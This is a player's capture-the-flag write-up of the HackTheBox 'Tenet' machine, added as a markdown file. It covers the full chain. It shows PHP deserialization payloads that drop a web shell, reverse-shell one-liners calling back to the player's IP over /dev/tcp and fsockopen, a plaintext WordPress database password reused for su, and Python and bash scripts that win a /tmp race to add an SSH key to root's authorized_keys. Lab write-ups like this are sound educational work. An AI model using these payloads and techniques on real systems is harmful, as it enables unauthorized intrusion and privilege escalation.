@@ -1,0 +1,330 @@
+#HackTheBox
+#Tenet
+
+Initial scan: 
+
+	kali@kali:~/CTF/HTB/Machines/Retired$ sudo nmap -sV -A -T4 10.10.10.223
+	[sudo] password for kali: 
+	Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-11 02:15 EST
+	Nmap scan report for 10.10.10.223
+	Host is up (0.11s latency).
+	Not shown: 998 closed ports
+	PORT   STATE SERVICE VERSION
+	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
+	|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
+	|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
+	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+	|_http-server-header: Apache/2.4.29 (Ubuntu)
+	|_http-title: Apache2 Ubuntu Default Page: It works
+	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+	TCP/IP fingerprint:
+	OS:SCAN(V=7.80%E=4%D=2/11%OT=22%CT=1%CU=32245%PV=Y%DS=2%DC=T%G=Y%TM=6024D9B
+	OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
+	OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+	OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+	OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+	OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+	OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+	OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+	OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+	OS:=S)
+
+	Network Distance: 2 hops
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	TRACEROUTE (using port 8888/tcp)
+	HOP RTT       ADDRESS
+	1   115.80 ms 10.10.14.1
+	2   117.66 ms 10.10.10.223
+
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 58.73 seconds
+
+
+So this box only has two services running, an http server and a ssh server. Let's check them out.
+
+The apache web server takes us to the default apache site. I tried fuzzing for clues but I was not successful. I have spent quite some time inspecting this box but I have not managed to get a clue.
+
+After getting some advice from users at the forums, I attempted looking for files named like the words on the sator square. I found a file called sator.php
+
+	[+] Grabbing users from text file
+	[] Database updated 
+
+The first line refers to a users text file, if we enter users.txt this is printed.
+
+	Success
+
+This is not very clear. I forgot to attempt sending a different header like I did when I was trying to root Doctor. Let's try adding tenet.htb to /etc/hosts and request it.
+
+It takes us to a site, where there are admins called Neil and Protagonist, like Robert Pattinson's and John David Washington's characters from Tenet. The protagonist has made a post about a site migration.
+
+
+	We’re moving our data over from a flat file structure to something a bit more substantial. Please bear with us whilst we get one of our devs on the migration, which shouldn’t take too long.
+
+	Thank you for your patience
+
+It has a comment written by Neil.
+
+	did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
+
+It looks like 'this is the end of a beautiful friendship' because the protagonist seems to have made a mistake. Neil is talking about the file I found earlier, but there also seems to be a backup. sator.php.bak?
+
+Yup. That was it. Requesting /sator.php.bak we have downloaded the following php code.
+
+	<?php
+
+	class DatabaseExport
+	{
+		public $user_file = 'users.txt';
+		public $data = '';
+
+		public function update_db()
+		{
+			echo '[+] Grabbing users from text file <br>';
+			$this-> data = 'Success';
+		}
+
+
+		public function __destruct()
+		{
+			file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
+			echo '[] Database updated <br>';		
+		//	echo 'Gotta get this working properly...';
+		}
+	}
+
+	$input = $_GET['arepo'] ?? '';
+	$databaseupdate = unserialize($input);
+
+	$app = new DatabaseExport;
+	$app -> update_db();
+
+I spent some time reading and understanding this code. I was unfamiliar with deserialization attacks on php, but this seems to be the way to go. You learn something new everyday I guess. 
+
+The script is unserializing user input which is not being sanitized, we can inject an object and change the values of user file and data. Here we will be exploiting the destruct magic function, which runs every time an object is created. Since the script writes anything to a file when it runs, we can write code to a php script. I had to craft a payload by serializing it and then I passed it as an input to the php file. (See: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
+
+This is my raw payload:
+
+	O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:39:"<?php echo shell_exec('ls -la /bin');?>";}
+
+This is how it gets requested:
+
+	http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:39:%22%3C?php%20echo%20shell_exec(%27ls%20-la%20/bin%27);?%3E%22;}
+
+I believe this type of attack sometimes may require payloads to be url encoded but the browser pretty much does it on its own, so I can just request this on my browser:
+
+	http://10.10.10.223/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:39:"<?php echo shell_exec('ls -la /bin');?>";}
+
+What I'm doing here is passing an object with the user_file and data attributes and their values. In this case the file is a php script and the data is the code which calls ls -ls.
+If we request http://10.10.10.223/shell.php we will see the output of the command.
+
+In order to make this more dynamic we can also do something like this:
+
+		http://10.10.10.223/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:38:"<?php echo shell_exec($_GET['cmd']);?>";}	
+
+We can request commands with our shell like this:
+
+	http://10.10.10.223/shell.php?cmd=ls
+
+	index.html non.php rce.php sator.php sator.php.bak shall.php shell.php users.txt wordpress 
+
+Now we have to try and get a reverse shell.
+
+So I made several attempts at getting a shell. I used many reverse shells from pentest monkey but for some reason I am unable to get a shell by injecting objects the way I did before. I must be missing something and I'm positive this can be pulled off the way I'm trying to, but I guess I can try something else.
+
+	O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:76:'<?php shell_exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.229/1234 0>&1\'"); ?>';}
+
+	http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A86%3A%22%3C%3Fphp%20%24sock%3Dfsockopen(%2710.10.14.229%27%2C1234)%3Bshell_exec(%27%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%27)%3B%20%3F%3E%22%3B%7D%0A
+
+	O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:86:"<?php $sock=fsockopen('10.10.14.229',1234);shell_exec('/bin/bash -i <&3 >&3 2>&3'); ?>";}
+
+None of them worked. So my next attempt was a php script, as I was suggested by a fellow htb player.
+The way this worked was that instead of serializing by hand i just serialized everything with the script. I copied the original class but gave the attributes the needed values, serialized it and then injected it. This one did the trick.
+
+	<?php
+	class DatabaseExport
+	{
+	        public $user_file = 'shell.php';
+	        public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.198/1234 0>&1\'"); ?>';
+
+	        public function update_db()
+	        {
+	                echo '[+] Grabbing users from text file <br>';
+	                $this-> data = 'Success';
+	        }
+
+
+	        public function destruct()
+	        {
+	                file_put_contents(__DIR . '/' . $this ->user_file, $this->data);
+	                echo '[] Database updated <br>';
+	        //      echo 'Gotta get this working properly...';
+	        }
+	}
+
+	$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport));
+	$response = file_get_contents("$url");
+	$response = file_get_contents("http://10.10.10.223/shell.php");
+	?>
+
+I setup a listener on my terminal and got a shell.
+
+	kali@kali:~/CTF/HTB/Machines/Live/Tenet$ nc -lvnp 1234
+	Ncat: Version 7.80 ( https://nmap.org/ncat )
+	Ncat: Listening on :::1234
+	Ncat: Listening on 0.0.0.0:1234
+	Ncat: Connection from 10.10.10.223.
+	Ncat: Connection from 10.10.10.223:60982.
+	python3 -c 'import pty; pty.spawn("/bin/bash");'
+	www-data@tenet:/var/www/html$ 
+
+I used linpeas.sh to look for privesc vectors, and I found credentials on a wordpress config file:
+
+	[+] Looking for Wordpress wp-config.php files
+	wp-config.php files found:
+	/var/www/html/wordpress/wp-config.php
+	define( 'DB_NAME', 'wordpress' );
+	define( 'DB_USER', 'neil' );
+	define( 'DB_PASSWORD', 'Opera2112' );
+	define( 'DB_HOST', 'localhost' );
+
+Does neil reuse passwords?, you may ask. Yes, he does.
+
+	www-data@tenet:/var/www/html$ su neil
+	su neil
+	Password: Opera2112
+
+	neil@tenet:/var/www/html$ ls
+
+The user flag is on Neil's home folder.
+
+	neil@tenet:~$ ls
+	user.txt
+
+Let's see if Neil can use sudo on something.
+
+	neil@tenet:~$ sudo -l
+	sudo -l
+	Matching Defaults entries for neil on tenet:
+	    env_reset, mail_badpass,
+	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
+
+	User neil may run the following commands on tenet:
+	    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
+
+He can run the enableSSH.sh script without a password. Let's see what it does.
+
+	#!/bin/bash
+
+	checkAdded() {
+
+		sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
+
+		if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+
+			/bin/echo "Successfully added $sshName to authorized_keys file!"
+
+		else
+
+			/bin/echo "Error in adding $sshName to authorized_keys file!"
+
+		fi
+
+	}
+
+	checkFile() {
+
+		if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+
+			/bin/echo "Error in creating key file!"
+
+			if [[ -f $1 ]]; then /bin/rm $1; fi
+
+			exit 1
+
+		fi
+
+	}
+
+	addKey() {
+
+		tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+
+		(umask 110; touch $tmpName)
+
+		/bin/echo $key >>$tmpName
+
+		checkFile $tmpName
+
+		/bin/cat $tmpName >>/root/.ssh/authorized_keys
+
+		/bin/rm $tmpName
+
+	}
+
+	key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
+	addKey
+	checkAdded
+
+The script generates a randomized name for a temp ssh file, gives read and write permissions to everyone and creates the file, then it writes an ssh key on the temp file and writes the contents of it on root's authorized_keys file. Then the file is deleted. I can hijack the file and write an ssh key of my own on the temp file, but I have to make it quick before it gets deleted. 
+
+Let's create a new pair of ssh keys.
+
+	kali@kali:~/CTF/HTB/Machines/Live/Tenet$ ssh-keygen
+	Generating public/private rsa key pair.
+	Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
+	/home/kali/.ssh/id_rsa already exists.
+	Overwrite (y/n)? y
+	Enter passphrase (empty for no passphrase): 
+	Enter same passphrase again: 
+	Your identification has been saved in /home/kali/.ssh/id_rsa
+	Your public key has been saved in /home/kali/.ssh/id_rsa.pub
+
+There. Now we need to make a script we can use to monitor the /tmp folder for new files. We won't have any issues with permissions because by default any user can read, write and execute on this folder. 
+
+	#!/bin/bash
+
+	i=0
+	while [ $i -lt 1000 ];
+	do
+	    watchdir=/tmp
+		newfile=$watchdir/.newer
+		touch $newfile
+	    find $watchdir -newer $newfile; 
+		touch -a -m $newfile;
+		cat id_rsa.pub >$newfile
+			if [[ $newfile == /tmp/ssh* ]]; then
+				cat $newfile
+			fi
+		echo $newfile
+		echo 'done'
+		let i=i+1 
+	done
+
+This was my first attempt. I requested my private key and the bash script to the box by setting up a web server on my kali machine, then I ran this script and while it runs it does find the newly created ssh temp file with the key but for some reason it is unable to write to it fast enough. I then tried using python, which worked.
+
+	import os
+
+	if __name__ == '__main__':
+		i=0
+		while i<10000:
+			for filename in os.listdir('/tmp'):
+				if filename.startswith('ssh-'):
+					os.system('echo ssh-rsa AAAA...>> /tmp/' + filename)
+				else:
+					print('a')
+				print(filename)
+			i=i+1
+
+This script wrote my ssh public key to the temp file. All I had to do now was connect using my ssh private key.
+
+	kali@kali:~/CTF/HTB/Machines/Live/Tenet$ ssh -i id_rsa root@10.10.10.223
+	Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
+
+	Last login: Sat Mar 13 02:28:37 2021 from 10.10.14.71
+	root@tenet:~# ls
+	root.txt
+
+This was a really fun box :) I really liked exploiting an object injection vulnerability on php. I had never done such thing and I think learning this can come in pretty handy in the future.
